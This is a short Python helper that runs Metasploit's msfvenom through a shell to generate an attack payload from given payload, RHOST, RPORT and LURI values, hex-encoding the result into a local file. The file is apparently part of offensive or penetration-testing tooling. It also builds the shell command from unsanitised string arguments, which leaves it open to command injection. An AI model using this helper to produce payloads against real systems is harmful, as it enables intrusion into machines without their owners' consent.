import subprocess

def msfvenom(payload, rhost, rport, luri):
    print(f"msfvenom is generating payload for {payload} ...")
    LURI_part = f" LURI={luri}" if luri else ""
    command = f"msfvenom -p {payload} RHOST={rhost} RPORT={rport} {LURI_part} -f raw | xxd -p | tr -d '\\n' > temp/payload.txt"
    subprocess.run(command, shell=True, check=True)